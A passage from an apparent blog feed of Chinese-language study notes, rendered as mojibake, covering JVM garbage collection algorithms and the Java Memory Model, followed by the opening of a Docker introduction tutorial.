<li>åˆ†æDumpå†…å­˜æ–‡ä»¶ï¼Œå¿«é€Ÿå®šä½å†…å­˜æ³„éœ²</li>
<li>è·å¾—å †ä¸­çš„æ•°æ®</li>
<li>è·å¾—å¤§çš„å¯¹è±¡</li>
<li>â€¦</li>
</ul>
<h1 id="ä¹ã€GCä»‹ç»ä¹‹å¼•ç”¨è®¡æ•°å™¨"><a href="#ä¹ã€GCä»‹ç»ä¹‹å¼•ç”¨è®¡æ•°å™¨" class="headerlink" title="ä¹ã€GCä»‹ç»ä¹‹å¼•ç”¨è®¡æ•°å™¨"></a>ä¹ã€GCä»‹ç»ä¹‹å¼•ç”¨è®¡æ•°å™¨</h1><p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-02/3e08fdadcb276e8d69cb5f7e3b8c055e--f1a5--image-20241002150143735.png" alt="image-20241002150143735"></p>
<p>JVMåœ¨è¿›è¡ŒGCæ—¶ï¼Œå¹¶ä¸æ˜¯å¯¹è¿™ä¸‰ä¸ªåŒºåŸŸç»Ÿä¸€å›æ”¶ï¼Œå¤§éƒ¨åˆ†çš„æ—¶å€™ï¼Œå›æ”¶éƒ½æ˜¯æ–°ç”Ÿä»£</p>
<ul>
<li>æ–°ç”ŸåŒº</li>
<li>å¹¸å­˜åŒº</li>
<li>è€å¹´åŒº</li>
</ul>
<p>GCç§ç±»ï¼š</p>
<ul>
<li>è½»GCï¼ˆæ™®é€šçš„GCï¼‰</li>
<li>é‡GCï¼ˆå…¨å±€çš„GCï¼‰</li>
</ul>
<p>GCé¢˜ç›®ï¼š</p>
<ul>
<li>JVMçš„å†…å­˜æ¨¡å‹å’Œåˆ†åŒºï¼Œè¯¦ç»†åˆ°æ¯ä¸ªåŒºæ”¾ä»€ä¹ˆï¼Ÿ</li>
<li>å †é‡Œé¢çš„åˆ†åŒºæœ‰å“ªäº›ï¼ŸEdenï¼Œfrom,to,è€å¹´åŒºï¼Œè¯´è¯´ä»–ä»¬çš„ç‰¹ç‚¹</li>
<li>GCçš„ç®—æ³•æœ‰å“ªäº›ï¼Ÿæ€ä¹ˆç”¨ï¼Ÿ<ul>
<li>æ ‡è®°æ¸…é™¤æ³•</li>
<li>æ ‡è®°å‹ç¼©</li>
<li>å¤åˆ¶ç®—æ³•</li>
<li>å¼•ç”¨è®¡æ•°å™¨</li>
</ul>
</li>
<li>è½»GCå’Œé‡GCåˆ†åˆ«æ˜¯åœ¨ä»€ä¹ˆä»€ä¹ˆæ—¶å€™å‘ç”Ÿï¼Ÿ</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-02/4decf139647e56d4315d0461f2a20f18--39c2--image-20241002150210872.png" alt="image-20241002150210872">s</p>
<h1 id="åã€GCä¹‹å¤åˆ¶ç®—æ³•"><a href="#åã€GCä¹‹å¤åˆ¶ç®—æ³•" class="headerlink" title="åã€GCä¹‹å¤åˆ¶ç®—æ³•"></a>åã€GCä¹‹å¤åˆ¶ç®—æ³•</h1><p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-02/22cc5c8b3199733d8c33c8bf306fe266--4c06--image-20241002151906956.png" alt="image-20241002151906956"></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-02/26875756d86816c75926906a4d67903c--038c--image-20241002152233036.png" alt="image-20241002152233036"></p>
<p>å¥½å¤„ï¼šæ²¡æœ‰å†…å­˜çš„ç¢ç‰‡</p>
<p>åå¤„ï¼šæµªè´¹äº†å†…å­˜ç©ºé—´ï¼Œå¤šäº†ä¸€åŠç©ºé—´æ°¸è¿œæ˜¯ç©ºï¼ˆToï¼‰ï¼Œå‡è®¾å¯¹è±¡100%å­˜æ´»(æç«¯æƒ…å†µ)</p>
<p>å¤åˆ¶ç®—æ³•æœ€ä½³ä½¿ç”¨åœºæ™¯ï¼šå¯¹è±¡å­˜æ´»åº¦è¾ƒä½çš„åŒºåŸŸï¼Œæ–°ç”ŸåŒº</p>
<h1 id="åä¸€ã€GCä¹‹æ ‡è®°å‹ç¼©æ¸…é™¤ç®—æ³•"><a href="#åä¸€ã€GCä¹‹æ ‡è®°å‹ç¼©æ¸…é™¤ç®—æ³•" class="headerlink" title="åä¸€ã€GCä¹‹æ ‡è®°å‹ç¼©æ¸…é™¤ç®—æ³•"></a>åä¸€ã€GCä¹‹æ ‡è®°å‹ç¼©æ¸…é™¤ç®—æ³•</h1><h2 id="æ ‡è®°æ¸…é™¤"><a href="#æ ‡è®°æ¸…é™¤" class="headerlink" title="æ ‡è®°æ¸…é™¤"></a>æ ‡è®°æ¸…é™¤</h2><p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-02/d9605fa66682ee4502ae00fc31e53fdb--c834--image-20241002152649930.png" alt="image-20241002152649930"></p>
<p>ä¼˜ç‚¹ï¼šä¸éœ€è¦é¢å¤–çš„ç©ºé—´ï¼</p>
<p>ç¼ºç‚¹ï¼šä¸¤æ¬¡æ‰«æï¼Œä¸¥é‡æµªè´¹æ—¶é—´ï¼Œä¼šäº§ç”Ÿå†…å­˜ç¢ç‰‡</p>
<h2 id="æ ‡è®°å‹ç¼©"><a href="#æ ‡è®°å‹ç¼©" class="headerlink" title="æ ‡è®°å‹ç¼©"></a>æ ‡è®°å‹ç¼©</h2><p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-02/f62b9bdd6057a232b59795de140c44a1--1843--image-20241002152705256.png" alt="image-20241002152705256"></p>
<h2 id="æ ‡è®°æ¸…é™¤å‹ç¼©"><a href="#æ ‡è®°æ¸…é™¤å‹ç¼©" class="headerlink" title="æ ‡è®°æ¸…é™¤å‹ç¼©"></a>æ ‡è®°æ¸…é™¤å‹ç¼©</h2><p>å…ˆæ ‡è®°æ¸…é™¤å‡ æ¬¡</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-02/c77c99081d771362defd654f3a2faf49--25b7--image-20241002152724230.png" alt="image-20241002152724230"></p>
<p>å†å‹ç¼©</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-02/4d9607858f7e3a699652c996668bb036--7231--image-20241002152734368.png" alt="image-20241002152734368"></p>
<h1 id="åäºŒã€GCç®—æ³•æ€»ç»“"><a href="#åäºŒã€GCç®—æ³•æ€»ç»“" class="headerlink" title="åäºŒã€GCç®—æ³•æ€»ç»“"></a>åäºŒã€GCç®—æ³•æ€»ç»“</h1><p>å†…å­˜æ•ˆç‡ï¼šå¤åˆ¶ç®—æ³• &gt; æ ‡è®°æ¸…é™¤ç®—æ³• &gt; æ ‡è®°å‹ç¼©ç®—æ³•ï¼ˆæ—¶é—´å¤æ‚åº¦ï¼‰</p>
<p>å†…å­˜æ•´é½åº¦ï¼šå¤åˆ¶ç®—æ³• &#x3D; æ ‡è®°å‹ç¼©ç®—æ³• &gt; æ ‡è®°æ¸…é™¤ç®—æ³•</p>
<p>å†…å­˜åˆ©ç”¨ç‡ï¼š æ ‡è®°å‹ç¼©ç®—æ³• &#x3D; æ ‡è®°æ¸…é™¤ç®—æ³• &gt; å¤åˆ¶ç®—æ³•</p>
<p>æ€è€ƒï¼šéš¾é“æ²¡æœ‰æœ€ä¼˜ç®—æ³•å—ï¼Ÿ</p>
<p>ç­”æ¡ˆï¼šæ²¡æœ‰ï¼Œæ²¡æœ‰æœ€å¥½çš„ç®—æ³•ï¼Œåªæœ‰æœ€åˆé€‚çš„ç®—æ³• â€”â€“ã€‹ GCï¼šåˆ†ä»£æ”¶é›†ç®—æ³•</p>
<p>å¹´è½»ä»£ï¼š</p>
<ul>
<li>å­˜æ´»ç‡ä½</li>
<li>å¤åˆ¶ç®—æ³•</li>
</ul>
<p>è€å¹´ä»£ï¼š</p>
<ul>
<li>åŒºåŸŸå¤§ï¼šå­˜æ´»ç‡</li>
<li>æ ‡è®°æ¸…é™¤ï¼ˆå†…å­˜ç¢ç‰‡ä¸æ˜¯å¤ªå¤šï¼‰+ æ ‡è®°å‹ç¼© æ··åˆå®ç°</li>
</ul>
<p>ä¸€å¤©æ—¶é—´å­¦JVM,ä¸ç°å®ï¼Œè¦æ·±ç©¶ï¼Œå¿…é¡»è¦èŠ±æ—¶é—´ï¼Œå¤šçœ‹é¢è¯•é¢˜ï¼Œä»¥åŠã€Šæ·±å…¥ç†è§£JVMã€‹</p>
<p>ä½†æ˜¯ï¼Œæˆ‘ä»¬å¯ä»¥æŒæ¡ä¸€ä¸ªå­¦ä¹ JVMçš„æ–¹æ³•</p>
<h1 id="åä¸‰ã€å¦‚ä½•å¿«é€Ÿå­¦ä¹ æ–¹æ³•è®²è§£"><a href="#åä¸‰ã€å¦‚ä½•å¿«é€Ÿå­¦ä¹ æ–¹æ³•è®²è§£" class="headerlink" title="åä¸‰ã€å¦‚ä½•å¿«é€Ÿå­¦ä¹ æ–¹æ³•è®²è§£"></a>åä¸‰ã€å¦‚ä½•å¿«é€Ÿå­¦ä¹ æ–¹æ³•è®²è§£</h1><p>JMM:java Memory Modelï¼ˆjavaå†…å­˜æ¨¡å‹ï¼‰</p>
<ol>
<li><p>ä»€ä¹ˆæ˜¯JMM</p>
<p>ã€JMMã€‘ï¼ˆJava Memory Modelçš„ç¼©å†™ï¼‰</p>
</li>
<li><p>å®ƒå¹²å˜›çš„ï¼Ÿâ€“ å®˜æ–¹ï¼Œå…¶ä»–äººçš„åšå®¢ï¼Œå¯¹åº”çš„è§†é¢‘</p>
<p>ä½œç”¨ï¼šç¼“å­˜ä¸€è‡´æ€§åè®®ï¼Œç”¨äºå®šä¹‰æ•°æ®è¯»å†™çš„è§„åˆ™ï¼ˆéµå®ˆï¼Œæ‰¾åˆ°è¿™ä¸ªè§„åˆ™ï¼‰</p>
<p>JMMå®šä¹‰äº†çº¿ç¨‹å·¥ä½œå†…å­˜å’Œä¸»å†…å­˜ä¹‹é—´çš„æŠ½è±¡å…³ç³»ï¼Œçº¿ç¨‹ä¹‹é—´çš„å…±äº«å˜é‡å­˜å‚¨åœ¨ä¸»å†…å­˜ï¼ˆMain Memoryï¼‰ä¸­ï¼Œæ¯ä¸ªçº¿ç¨‹éƒ½æœ‰ä¸€ä¸ªç§æœ‰çš„æœ¬åœ°å†…å­˜ï¼ˆLocal Memoryï¼‰</p>
</li>
</ol>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-02/a0441016fecf4962d73058e54efe8f11--fc1d--image-20241002152846508.png" alt="image-20241002152846508"></p>
<ol>
<li><p>è§£å†³å…±äº«å¯¹è±¡å¯è§æ€§è¿™ä¸ªé—®é¢˜ï¼švolatile</p>
</li>
<li><p>å®ƒè¯¥å¦‚ä½•å­¦ä¹ ï¼Ÿ</p>
<p>JMMï¼šæŠ½è±¡çš„æ¦‚å¿µï¼Œç†è®º</p>
<p>JMMå¯¹è¿™å…«ç§æŒ‡ä»¤çš„ä½¿ç”¨ï¼Œåˆ¶å®šäº†å¦‚ä¸‹è§„åˆ™ï¼š</p>
<ul>
<li><p>ä¸å…è®¸readå’Œloadã€storeå’Œwriteæ“ä½œä¹‹ä¸€å•ç‹¬å‡ºç°ã€‚å³ä½¿ç”¨äº†readå¿…é¡»loadï¼Œä½¿ç”¨äº†storeå¿…é¡»write</p>
</li>
<li><p>ä¸å…è®¸çº¿ç¨‹ä¸¢å¼ƒä»–æœ€è¿‘çš„assignæ“ä½œï¼Œå³å·¥ä½œå˜é‡çš„æ•°æ®æ”¹å˜äº†ä¹‹åï¼Œå¿…é¡»å‘ŠçŸ¥ä¸»å­˜</p>
</li>
<li><p>ä¸å…è®¸ä¸€ä¸ªçº¿ç¨‹å°†æ²¡æœ‰assignçš„æ•°æ®ä»å·¥ä½œå†…å­˜åŒæ­¥å›ä¸»å†…å­˜</p>
</li>
<li><p>ä¸€ä¸ªæ–°çš„å˜é‡å¿…é¡»åœ¨ä¸»å†…å­˜ä¸­è¯ç”Ÿï¼Œä¸å…è®¸å·¥ä½œå†…å­˜ç›´æ¥ä½¿ç”¨ä¸€ä¸ªæœªè¢«åˆå§‹åŒ–çš„å˜é‡ã€‚å°±æ˜¯æ€¼å˜é‡å®æ–½useã€storeæ“ä½œä¹‹å‰ï¼Œå¿…é¡»ç»è¿‡assignå’Œloadæ“ä½œ</p>
</li>
<li><p>ä¸€ä¸ªå˜é‡åŒä¸€æ—¶é—´åªæœ‰ä¸€ä¸ªçº¿ç¨‹èƒ½å¯¹å…¶è¿›è¡Œlockã€‚å¤šæ¬¡lockåï¼Œå¿…é¡»æ‰§è¡Œç›¸åŒæ¬¡æ•°çš„unlockæ‰èƒ½è§£é”</p>
</li>
<li><p>å¦‚æœå¯¹ä¸€ä¸ªå˜é‡è¿›è¡Œlockæ“ä½œï¼Œä¼šæ¸…ç©ºæ‰€æœ‰å·¥ä½œå†…å­˜ä¸­æ­¤å˜é‡çš„å€¼ï¼Œåœ¨æ‰§è¡Œå¼•æ“ä½¿ç”¨è¿™ä¸ªå˜é‡å‰ï¼Œå¿…é¡»é‡æ–°loadæˆ–assignæ“ä½œåˆå§‹åŒ–å˜é‡çš„å€¼</p>
</li>
<li><p>å¦‚æœä¸€ä¸ªå˜é‡æ²¡æœ‰è¢«lockï¼Œå°±ä¸èƒ½å¯¹å…¶è¿›è¡Œunlockæ“ä½œã€‚ä¹Ÿä¸èƒ½unlockä¸€ä¸ªè¢«å…¶ä»–çº¿ç¨‹é”ä½çš„å˜é‡</p>
</li>
<li><p>å¯¹ä¸€ä¸ªå˜é‡è¿›è¡Œunlockæ“ä½œä¹‹å‰ï¼Œå¿…é¡»æŠŠæ­¤å˜é‡åŒæ­¥å›ä¸»å†…å­˜</p>
</li>
</ul>
<p>JMMå¯¹è¿™å…«ç§æ“ä½œè§„åˆ™å’Œå¯¹<a href="https://www.cnblogs.com/null-qige/p/8569131.html">volatileçš„ä¸€äº›ç‰¹æ®Šè§„åˆ™</a>å°±èƒ½ç¡®å®šå“ªé‡Œæ“ä½œæ˜¯çº¿ç¨‹å®‰å…¨ï¼Œå“ªäº›æ“ä½œæ˜¯çº¿ç¨‹ä¸å®‰å…¨çš„äº†ã€‚ä½†æ˜¯è¿™äº›è§„åˆ™å®åœ¨å¤æ‚ï¼Œå¾ˆéš¾åœ¨å®è·µä¸­ç›´æ¥åˆ†æã€‚æ‰€ä»¥ä¸€èˆ¬æˆ‘ä»¬ä¹Ÿä¸ä¼šé€šè¿‡ä¸Šè¿°è§„åˆ™è¿›è¡Œåˆ†æã€‚æ›´å¤šçš„æ—¶å€™ï¼Œä½¿ç”¨javaçš„happen-beforeè§„åˆ™æ¥è¿›è¡Œåˆ†æã€‚</p>
</li>
</ol>
<hr>
<p>   å­¦ä¹ æ–°ä¸œè¥¿æ˜¯å¸¸æ€</p>
<p>   é’ˆå¯¹é¢è¯•å­¦ä¹ </p>
<p>   é’ˆå¯¹æŠ€æœ¯å­¦ä¹ </p>
<p>   é¢è¯•ï¼š</p>
<p>   3&#x2F;10 &#x3D;&#x3D; pass ï¼Œé¢ç» &#x3D;10 ï¼Œåˆ†æè¿™10ä¸ªï¼Ÿè§¦ç±»æ—é€šï¼šç™¾åº¦é¢è¯•é¢˜</p>
<p>   é€šè¿‡å¤§é‡çš„é¢è¯•æ€»ç»“ï¼Œå¾—å‡ºä¸€å¥—è§£é¢˜æ€è·¯</p>
<p>æ›´å¤šé˜…è¯»ï¼š<a href="https://mp.weixin.qq.com/s/nSwNZpObWLGteG-v7n5PSw">https://mp.weixin.qq.com/s/nSwNZpObWLGteG-v7n5PSw</a></p>
]]></content>
  </entry>
  <entry>
    <title>Dockerå­¦ä¹ </title>
    <url>/2024/09/21/Docker%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>Dockeræœ€è¿‘ç”¨çš„çœŸå¤š</p>
<span id="more"></span>

<h1 id="ä¸€ã€Dockeræ¦‚è¿°"><a href="#ä¸€ã€Dockeræ¦‚è¿°" class="headerlink" title="ä¸€ã€Dockeræ¦‚è¿°"></a>ä¸€ã€Dockeræ¦‚è¿°</h1><h2 id="1ã€dockerä¸ºä»€ä¹ˆä¼šå‡ºç°"><a href="#1ã€dockerä¸ºä»€ä¹ˆä¼šå‡ºç°" class="headerlink" title="1ã€dockerä¸ºä»€ä¹ˆä¼šå‡ºç°"></a>1ã€dockerä¸ºä»€ä¹ˆä¼šå‡ºç°</h2><p>å·¥ä½œä¸­ï¼Œç»å¸¸å‡ºç°â€œåœ¨æˆ‘çš„æœºå™¨ä¸Šå¯æ­£å¸¸å·¥ä½œâ€çš„é—®é¢˜</p>
<p>å› ä¸ºç¯å¢ƒä¸ä¸€è‡´ç­‰åŸå› å¯¼è‡´ã€‚ã€‚ã€‚</p>
<p>Dockerçš„æ€æƒ³å°±æ¥è‡ªäºé›†è£…ç®±ï¼</p>
<p>éš”ç¦»ï¼šDockeræ ¸å¿ƒæ€æƒ³ï¼æ‰“åŒ…è£…ç®±ï¼æ¯ä¸ªç®±å­æ˜¯äº’ç›¸éš”ç¦»çš„ã€‚</p>
<p>Dockeré€šè¿‡éš”ç¦»æœºåˆ¶ï¼Œå¯ä»¥å°†æœåŠ¡å™¨åˆ©ç”¨åˆ°æè‡´ï¼</p>
<h2 id="2ã€Dockerçš„å†å²"><a href="#2ã€Dockerçš„å†å²" class="headerlink" title="2ã€Dockerçš„å†å²"></a>2ã€Dockerçš„å†å²</h2><p>Docker æ˜¯åŸºäºGo è¯­è¨€å®ç°çš„å¼€æºå®¹å™¨é¡¹ç›®ï¼Œè¯ç”Ÿäº2013 å¹´å¹´åˆï¼Œæœ€åˆå‘èµ·è€…æ˜¯ dotCloud å…¬å¸ã€‚Docker è‡ªå¼€æºåå—åˆ°å¹¿æ³›çš„å…³æ³¨å’Œl è®¨è®ºï¼Œç›®å‰å·²æœ‰å¤šä¸ªç›¸å…³é¡¹ç›®ï¼ˆåŒ…æ‹¬ Docker ä¸‰å‰‘å®¢ã€Kubemetes ç­‰ï¼‰ï¼Œé€æ¸å½¢æˆäº†å›´ç»•Docker å®¹å™¨çš„ç”Ÿæ€ä½“ç³»ã€‚ ç”±äºDocker åœ¨ä¸šç•Œé€ æˆçš„å½±å“åŠ›å®åœ¨å¤ªå¤§ï¼Œ dotCloud å…¬å¸åæ¥ä¹Ÿç›´æ¥æ”¹åä¸ºDocker Inc ï¼Œå¹¶ä¸“æ³¨äºDocker ç›¸å…³æŠ€æœ¯å’Œäº§å“çš„å¼€å‘ã€‚</p>
<p>è‡ªä»dotCloudå…¬å¸å¼€æºå…¶Dockeré¡¹ç›®åï¼Œå‡­å€Ÿå…¶ä¾¿æ·çš„Dockeré•œåƒæŠ€æœ¯è§£å†³äº†å½“æ—¶å›°æ‰°ä¼—å¤šPaaSé¡¹ç›®çš„éš¾é¢˜ï¼šå¦‚ä½•ä¸ºåº”ç”¨æ‰“åŒ…ï¼Œè®©ç”¨æˆ·å°†æœ¬åœ°çš„åº”ç”¨é¡ºåˆ©è¿ç§»åˆ°PaaSå¹³å°ï¼Œè€Œä¸ç”¨é¡¾å¿Œåº”ç”¨çš„å¼€å‘è¯­è¨€ã€é…ç½®ã€ä¾èµ–åŒ…ç­‰è¯¸å¤šå› ç´ ï¼Œä¹Ÿå› æ­¤å¼€å¯äº†å…¨æ–°çš„Dockerå®¹å™¨æ—¶ä»£ã€‚</p>
<h2 id="3ã€Dockerèƒ½å¹²å˜›"><a href="#3ã€Dockerèƒ½å¹²å˜›" class="headerlink" title="3ã€Dockerèƒ½å¹²å˜›"></a>3ã€Dockerèƒ½å¹²å˜›</h2><p>å¯¹å¼€å‘å’Œè¿ç»´ï¼ˆ <strong>DevOps</strong> ï¼‰äººå‘˜æ¥è¯´ï¼Œå¯èƒ½æœ€æ¢¦å¯ä»¥æ±‚çš„æ•ˆæœå°±æ˜¯ä¸€æ¬¡åˆ›å»ºæˆ–é…ç½®ï¼Œ ä¹‹åå¯ä»¥åœ¨ä»»æ„åœ°æ–¹ã€ä»»æ„æ—¶é—´è®©åº”ç”¨æ­£å¸¸è¿è¡Œã€‚</p>
<p>å…·ä½“è¯´æ¥ï¼Œ Docker åœ¨å¼€å‘å’Œè¿ç»´è¿‡ç¨‹ä¸­ï¼Œå…·æœ‰å¦‚ä¸‹å‡ ä¸ªæ–¹é¢çš„ä¼˜åŠ¿ï¼š</p>
<ol>
<li><p><strong>æ›´å¿«é€Ÿçš„äº¤ä»˜å’Œéƒ¨ç½²</strong></p>
<p>ä½¿ç”¨Docker ï¼Œå¼€å‘äººå‘˜å¯ä»¥ä½¿ç”¨é•œåƒæ¥å¿«é€Ÿæ„å»ºä¸€å¥—æ ‡å‡†çš„å¼€å‘ç¯å¢ƒï¼›å¼€å‘å®Œæˆä¹‹åï¼Œæµ‹è¯•å’Œè¿ç»´äººå‘˜å¯ä»¥ç›´æ¥ä½¿ç”¨å®Œå…¨ç›¸åŒç¯å¢ƒæ¥éƒ¨ç½²ä»£ç ã€‚åªè¦å¼€å‘æµ‹è¯•è¿‡çš„ä»£ç ï¼Œå°±å¯ä»¥ç¡®ä¿åœ¨ç”Ÿäº§ç¯å¢ƒæ— ç¼è¿è¡Œã€‚Docker å¯ä»¥å¿«é€Ÿåˆ›å»ºå’Œåˆ é™¤å®¹å™¨ï¼Œå®ç°å¿«é€Ÿè¿­ä»£ï¼Œå¤§é‡èŠ‚çº¦å¼€å‘ã€æµ‹è¯•ã€éƒ¨ç½²çš„æ—¶é—´ã€‚å¹¶ä¸”ï¼Œæ•´ä¸ªè¿‡ç¨‹å…¨ç¨‹å¯è§ï¼Œä½¿å›¢é˜Ÿæ›´å®¹æ˜“ç†è§£åº”ç”¨çš„åˆ›å»ºå’Œå·¥ä½œè¿‡ç¨‹ã€‚</p>
</li>
<li><p><strong>æ›´é«˜æ•ˆçš„èµ„æºåˆ©ç”¨</strong></p>
<p>Docker å®¹å™¨çš„è¿è¡Œä¸éœ€è¦é¢å¤–çš„è™šæ‹ŸåŒ–ç®¡ç†ç¨‹åºï¼ˆVirtual Machine Manager, VMM ï¼Œä»¥åŠHypervisorï¼‰æ”¯æŒï¼Œå®ƒæ˜¯å†…æ ¸çº§çš„è™šæ‹ŸåŒ–ï¼Œå¯ä»¥å®ç°æ›´é«˜çš„æ€§èƒ½ï¼ŒåŒæ—¶å¯¹èµ„æºçš„é¢å¤–éœ€æ±‚å¾ˆä½ã€‚è·Ÿä¼ ç»Ÿè™šæ‹Ÿæœºæ–¹å¼ç›¸æ¯”ï¼Œè¦æé«˜ä¸€åˆ°ä¸¤ä¸ªæ•°é‡çº§ã€‚</p>
</li>
<li><p><strong>æ›´è½»æ¾çš„è¿ç§»å’Œæ‰©å±•</strong></p>
<p>Docker å®¹å™¨å‡ ä¹å¯ä»¥åœ¨ä»»æ„çš„å¹³å°ä¸Šè¿è¡Œï¼ŒåŒ…æ‹¬ç‰©ç†æœºã€è™šæ‹Ÿæœºã€å…¬æœ‰äº‘ã€ç§æœ‰äº‘ã€ä¸ªäººç”µè„‘ã€æœåŠ¡å™¨ç­‰ï¼ŒåŒæ—¶æ”¯æŒä¸»æµçš„æ“ä½œç³»ç»Ÿå‘è¡Œç‰ˆæœ¬ã€‚è¿™ç§å…¼å®¹æ€§è®©ç”¨æˆ·å¯ä»¥åœ¨ä¸åŒå¹³å°ä¹‹é—´è½»æ¾åœ°è¿ç§»åº”ç”¨ã€‚</p>
</li>
<li><p><strong>æ›´ç®€å•çš„æ›´æ–°ç®¡ç†</strong></p>
<p>ä½¿ç”¨Dockerfile ï¼Œåªéœ€è¦å°å°çš„é…ç½®ä¿®æ”¹ï¼Œå°±å¯ä»¥æ›¿ä»£ä»¥å¾€å¤§é‡çš„æ›´æ–°å·¥ä½œã€‚å¹¶ä¸”æ‰€æœ‰ä¿®æ”¹éƒ½ä»¥å¢é‡çš„æ–¹å¼è¢«åˆ†å‘å’Œæ›´æ–°ï¼Œä»è€Œå®ç°è‡ªåŠ¨åŒ–å¹¶ä¸”é«˜æ•ˆçš„å®¹å™¨ç®¡ç†ã€‚</p>
</li>
</ol>
<blockquote>
<p>Docker å’Œå¸¸è§çš„è™šæ‹ŸåŒ–æ–¹å¼çš„ä¸åŒä¹‹å¤„</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-21/46de97d6c7d3ec4bc0c24d94f32025ee--6893--image-20240921201222753.png" alt="image-20240921201222753"></p>
<p><strong>ä¼ ç»Ÿæ–¹å¼æ˜¯åœ¨ç¡¬ä»¶å±‚é¢å®ç°è™šæ‹ŸåŒ–ï¼Œéœ€è¦æœ‰é¢å¤–çš„è™šæ‹Ÿæœºç®¡ç†åº”ç”¨å’Œè™šæ‹Ÿæœºæ“ä½œç³»ç»Ÿ</strong> <strong>å±‚ã€‚Docker å®¹å™¨æ˜¯åœ¨æ“ä½œç³»ç»Ÿå±‚é¢ä¸Šå®ç°è™šæ‹ŸåŒ–ï¼Œç›´æ¥å¤ç”¨æœ¬åœ°ä¸»æœºçš„æ“ä½œç³»ç»Ÿï¼Œå› æ­¤æ›´åŠ </strong> <strong>è½»é‡çº§ã€‚</strong></p>
<p>Docker åœ¨å®¹å™¨çš„åŸºç¡€ä¸Šï¼Œè¿›è¡Œäº†è¿›ä¸€æ­¥çš„å°è£…ï¼Œä»æ–‡ä»¶ç³»ç»Ÿã€ç½‘ç»œäº’è”åˆ°è¿›ç¨‹éš”ç¦»ç­‰ç­‰ï¼Œæå¤§çš„ç®€åŒ–äº†å®¹å™¨çš„åˆ›å»ºå’Œç»´æŠ¤ã€‚ä½¿å¾— Docker æŠ€æœ¯æ¯”è™šæ‹ŸæœºæŠ€æœ¯æ›´ä¸ºè½»ä¾¿ã€å¿«æ·ã€‚</p>
<p>ä½œä¸ºä¸€ç§æ–°å…´çš„è™šæ‹ŸåŒ–æ–¹å¼ï¼ŒDocker è·Ÿä¼ ç»Ÿçš„è™šæ‹ŸåŒ–æ–¹å¼ç›¸æ¯”å…·æœ‰ä¼—å¤šçš„ä¼˜åŠ¿ã€‚Docker å®¹å™¨çš„å¯åŠ¨å¯ä»¥åœ¨ç§’çº§å®ç°ï¼Œè¿™ç›¸æ¯”ä¼ ç»Ÿçš„è™šæ‹Ÿæœºæ–¹å¼è¦å¿«å¾—å¤šï¼›Docker å¯¹ç³»ç»Ÿèµ„æºçš„åˆ©ç”¨ç‡å¾ˆé«˜ï¼Œä¸€å°ä¸»æœºä¸Šå¯ä»¥åŒæ—¶è¿è¡Œæ•°åƒä¸ª Docker å®¹å™¨ã€‚</p>
<h1 id="äºŒã€Dockerå®‰è£…"><a href="#äºŒã€Dockerå®‰è£…" class="headerlink" title="äºŒã€Dockerå®‰è£…"></a>äºŒã€Dockerå®‰è£…</h1><h2 id="1ã€Dockerçš„åŸºæœ¬ç»„æˆ"><a href="#1ã€Dockerçš„åŸºæœ¬ç»„æˆ" class="headerlink" title="1ã€Dockerçš„åŸºæœ¬ç»„æˆ"></a>1ã€Dockerçš„åŸºæœ¬ç»„æˆ</h2><p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-21/cdad8f4b97c506bb09c7c4b085b817bb--d293--image-20240921201553913.png" alt="image-20240921201553913"></p>
<ul>
<li><p><strong>é•œåƒï¼ˆImageï¼‰</strong></p>
<p>ä»€ä¹ˆæ˜¯ Docker é•œåƒï¼Ÿç®€å•çš„ç†è§£ï¼ŒDocker é•œåƒå°±æ˜¯ä¸€ä¸ª Linux çš„æ–‡ä»¶ç³»ç»Ÿï¼ˆRoot FileSystemï¼‰ï¼Œè¿™ä¸ªæ–‡ä»¶ç³»ç»Ÿé‡Œé¢åŒ…å«å¯ä»¥è¿è¡Œåœ¨ Linux å†…æ ¸çš„ç¨‹åºä»¥åŠç›¸åº”çš„æ•°æ®ã€‚</p>
<p>é€šè¿‡é•œåƒå¯åŠ¨ä¸€ä¸ªå®¹å™¨ï¼Œä¸€ä¸ªé•œåƒå°±æ˜¯ä¸€ä¸ªå¯æ‰§è¡Œçš„åŒ…ï¼Œå…¶ä¸­åŒ…æ‹¬è¿è¡Œåº”ç”¨ç¨‹åºæ‰€éœ€è¦çš„æ‰€æœ‰å†…å®¹ï¼šåŒ…å«ä»£ç ï¼Œè¿è¡Œæ—¶é—´ï¼Œåº“ï¼Œç¯å¢ƒå˜é‡å’Œé…ç½®æ–‡ä»¶ç­‰ã€‚</p>
<p><strong>Docker æŠŠ App æ–‡ä»¶æ‰“åŒ…æˆä¸ºä¸€ä¸ªé•œåƒ</strong>ï¼Œå¹¶ä¸”é‡‡ç”¨ç±»ä¼¼å¤šæ¬¡å¿«ç…§çš„å­˜å‚¨æŠ€æœ¯ï¼Œå¯ä»¥å®ç°ï¼š</p>
<ul>
<li>å¤šä¸ª App å¯ä»¥å…±ç”¨ç›¸åŒçš„åº•å±‚é•œåƒï¼ˆåˆå§‹çš„æ“ä½œç³»ç»Ÿé•œåƒï¼‰</li>
<li>App è¿è¡Œæ—¶çš„ IO æ“ä½œå’Œé•œåƒæ–‡ä»¶éš”ç¦»</li>
<li>é€šè¿‡æŒ‚è½½åŒ…å«ä¸åŒé…ç½®&#x2F;æ•°æ®æ–‡ä»¶çš„ç›®å½•æˆ–è€…å·ï¼ˆVolumeï¼‰ï¼Œå•ä¸ª App é•œåƒå¯ä»¥ç”¨æ¥è¿è¡Œæ— æ•°ä¸ªä¸åŒä¸šåŠ¡çš„å®¹å™¨</li>
</ul>
</li>
<li><p><strong>å®¹å™¨ï¼ˆcontainerï¼‰</strong></p>
